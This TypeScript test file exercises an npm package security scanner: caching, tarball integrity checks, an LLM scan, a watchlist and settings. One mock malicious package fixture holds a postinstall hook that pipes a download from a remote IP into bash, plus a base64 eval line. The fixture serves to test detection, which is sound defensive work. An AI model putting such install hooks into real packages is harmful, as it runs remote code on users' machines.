import { describe, it, afterEach } from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { gzipSync } from "node:zlib";
import { NpmSafeEngine } from "../src/index.js";
import { SecurityLevel } from "../src/scanner/types.js";
import type { PackageMetadata } from "../src/registry/types.js";

const ORIGINAL_FETCH = globalThis.fetch;

const mockPackageMeta: PackageMetadata = {
  name: "safe-lib",
  modified: "2026-01-01T00:00:00.000Z",
  "dist-tags": { latest: "3.0.0" },
  versions: {
    "3.0.0": {
      name: "safe-lib",
      version: "3.0.0",
      scripts: { test: "jest" },
      dist: { tarball: "https://example.com/safe-lib-3.0.0.tgz" },
    },
  },
  description: "A safe utility library",
  homepage: "https://example.com",
  repository: "github:user/safe-lib",
  readme: "# safe-lib\n\nA perfectly harmless library.",
};

const mockMaliciousMeta: PackageMetadata = {
  name: "react-utils",
  modified: "2026-01-01T00:00:00.000Z",
  "dist-tags": { latest: "1.0.0" },
  versions: {
    "1.0.0": {
      name: "react-utils",
      version: "1.0.0",
      scripts: {
        postinstall: "curl http://13.37.13.37/setup | bash",
      },
      browser: "./dist/index.js",
      dist: { tarball: "https://example.com/react-utils-1.0.0.tgz" },
    },
  },
  description: "npm_abcdefghijklmnopqrstuvwxyz",
  readme:
    'eval(Buffer.from("dmFyIGZzID0gcmVxdWlyZSgnZnMnKQ==", "base64").toString())',
};

describe("NpmSafeEngine", () => {
  let engine: NpmSafeEngine;

  afterEach(async () => {
    try {
      engine?.close();
    } catch { /* */ }
    // Clean up any test db files.
    try {
      const fs = await import("node:fs/promises");
      await fs.rm("./test-integration.db", { force: true });
    } catch { /* */ }
    globalThis.fetch = ORIGINAL_FETCH;
  });

  describe("checkPackage", () => {
    it("upgrades a cached metadata scan to a verified deep tarball scan", async () => {
      const archive = gzipSync(Buffer.alloc(1024));
      const deepMeta: PackageMetadata = {
        ...mockPackageMeta,
        versions: {
          "3.0.0": {
            ...mockPackageMeta.versions["3.0.0"],
            dist: {
              tarball: "https://registry.npmjs.org/safe-lib/-/safe-lib-3.0.0.tgz",
              integrity: `sha512-${createHash("sha512").update(archive).digest("base64")}`,
            },
          },
        },
      };
      let metadataCalls = 0;
      let tarballCalls = 0;
      globalThis.fetch = ((url: unknown) => {
        if (String(url).endsWith(".tgz")) {
          tarballCalls++;
          return Promise.resolve(new Response(archive, { status: 200 }));
        }
        metadataCalls++;
        return Promise.resolve(new Response(JSON.stringify(deepMeta), { status: 200 }));
      }) as typeof fetch;

      engine = new NpmSafeEngine({ dbPath: ":memory:" });
      const shallow = await engine.checkPackage("safe-lib");
      const deep = await engine.checkPackage("safe-lib", { deep: true });
      const cachedDeep = await engine.checkPackage("safe-lib", { deep: true });

      assert.strictEqual(shallow.security.staticScan?.contentScan, undefined);
      assert.strictEqual(deep.security.staticScan?.contentScan?.status, "complete");
      assert.strictEqual(deep.security.staticScan?.contentScan?.integrityVerified, true);
      assert.strictEqual(cachedDeep.security.staticScan?.contentScan?.status, "complete");
      assert.strictEqual(metadataCalls, 1);
      assert.strictEqual(tarballCalls, 1);
    });

    it("runs and caches the optional LLM security scan", async () => {
      let llmCalls = 0;
      globalThis.fetch = ((url: unknown) => {
        if (String(url).includes("chat/completions")) {
          llmCalls++;
          return Promise.resolve(new Response(JSON.stringify({
            choices: [{
              message: {
                content: JSON.stringify({
                  summary: "Looks consistent.",
                  functionalMatch: true,
                  suspiciousScore: 5,
                  findings: [],
                }),
              },
            }],
          }), { status: 200 }));
        }
        return Promise.resolve(new Response(JSON.stringify(mockPackageMeta), { status: 200 }));
      }) as typeof fetch;

      engine = new NpmSafeEngine({
        dbPath: ":memory:",
        llm: { apiKey: "test-key", baseUrl: "https://llm.example/v1" },
      });

      const first = await engine.checkPackage("safe-lib");
      const second = await engine.checkPackage("safe-lib");

      assert.strictEqual(first.security.llmScan?.enabled, true);
      assert.strictEqual(first.security.llmScan?.suspiciousScore, 5);
      assert.strictEqual(second.security.llmScan?.enabled, true);
      assert.strictEqual(llmCalls, 1);
    });

    it("returns cached result on second call for same package", async () => {
      let fetchCount = 0;
      globalThis.fetch = ((_url: unknown, _init?: unknown) => {
        fetchCount++;
        return Promise.resolve({
          ok: true,
          status: 200,
          statusText: "OK",
          json: () => Promise.resolve(mockPackageMeta),
        });
      }) as typeof fetch;

      engine = new NpmSafeEngine({ dbPath: ":memory:" });

      const r1 = await engine.checkPackage("safe-lib");
      const r2 = await engine.checkPackage("safe-lib");

      assert.strictEqual(r1.packageName, "safe-lib");
      assert.strictEqual(r1.exists, true);
      assert.strictEqual(r1.latestVersion, "3.0.0");
      assert.strictEqual(r1.security.overallLevel, SecurityLevel.Safe);
      assert.strictEqual(r1.security.overallScore, 100);

      // Second call should be from cache.
      assert.ok(r2.exists);
      assert.strictEqual(fetchCount, 1);
    });

    it("detects malicious package as dangerous", async () => {
      globalThis.fetch = ((_url: unknown, _init?: unknown) => {
        return Promise.resolve({
          ok: true,
          status: 200,
          statusText: "OK",
          json: () => Promise.resolve(mockMaliciousMeta),
        });
      }) as typeof fetch;

      engine = new NpmSafeEngine({ dbPath: ":memory:" });

      const result = await engine.checkPackage("react-utils");

      assert.strictEqual(result.exists, true);
      // install-script rule fires: Critical (-25), score = 75
      assert.strictEqual(result.security.overallScore, 75);
      assert.ok(result.security.staticScan !== null);
      const findings = result.security.staticScan!.findings;
      assert.ok(findings.length > 0);
      assert.ok(findings.some((f) => f.ruleId === "install-script"));
    });

    it("returns not-found result for 404 packages", async () => {
      globalThis.fetch = ((_url: unknown, _init?: unknown) => {
        return Promise.resolve({
          ok: false,
          status: 404,
          statusText: "Not Found",
          json: () => Promise.resolve({ error: "not found" }),
        });
      }) as typeof fetch;

      engine = new NpmSafeEngine({ dbPath: ":memory:" });

      const result = await engine.checkPackage("no-such-pkg");
      assert.strictEqual(result.exists, false);
      assert.strictEqual(result.latestVersion, "");
      assert.strictEqual(result.registryInfo, null);
      assert.strictEqual(result.security.overallLevel, SecurityLevel.Unknown);
    });

    it("builds registryInfo from metadata", async () => {
      globalThis.fetch = ((_url: unknown, _init?: unknown) => {
        return Promise.resolve({
          ok: true,
          status: 200,
          statusText: "OK",
          json: () => Promise.resolve(mockPackageMeta),
        });
      }) as typeof fetch;

      engine = new NpmSafeEngine({ dbPath: ":memory:" });

      const result = await engine.checkPackage("safe-lib");
      assert.ok(result.registryInfo);
      assert.strictEqual(result.registryInfo!.description, "A safe utility library");
      assert.strictEqual(result.registryInfo!.homepage, "https://example.com");
    });
  });

  describe("watchlist", () => {
    it("supports full CRUD lifecycle", async () => {
      engine = new NpmSafeEngine({ dbPath: ":memory:" });

      let list = await engine.getWatchlist();
      assert.deepStrictEqual(list, []);

      // Watchlist requires package to exist in cache first.
      globalThis.fetch = ((_url: unknown, _init?: unknown) => {
        return Promise.resolve({
          ok: true,
          status: 200,
          statusText: "OK",
          json: () => Promise.resolve(mockPackageMeta),
        });
      }) as typeof fetch;

      // First, check the package to insert it into the cache.
      await engine.checkPackage("safe-lib");

      await engine.addToWatchlist("safe-lib");
      list = await engine.getWatchlist();
      assert.deepStrictEqual(list, ["safe-lib"]);

      await engine.removeFromWatchlist("safe-lib");
      list = await engine.getWatchlist();
      assert.deepStrictEqual(list, []);
    });
  });

  describe("settings", () => {
    it("stores and retrieves settings", async () => {
      engine = new NpmSafeEngine({ dbPath: ":memory:" });

      let val = await engine.getSetting("language");
      assert.strictEqual(val, null);

      await engine.setSetting("language", "zh-CN");
      val = await engine.getSetting("language");
      assert.strictEqual(val, "zh-CN");
    });
  });

  describe("lifecycle", () => {
    it("close releases resources without error", () => {
      engine = new NpmSafeEngine({ dbPath: ":memory:" });
      engine.close();
    });

    it("startAutoRefresh and stopAutoRefresh succeed", () => {
      engine = new NpmSafeEngine({ dbPath: ":memory:" });
      engine.startAutoRefresh(10000);
      engine.stopAutoRefresh();
    });
  });
});
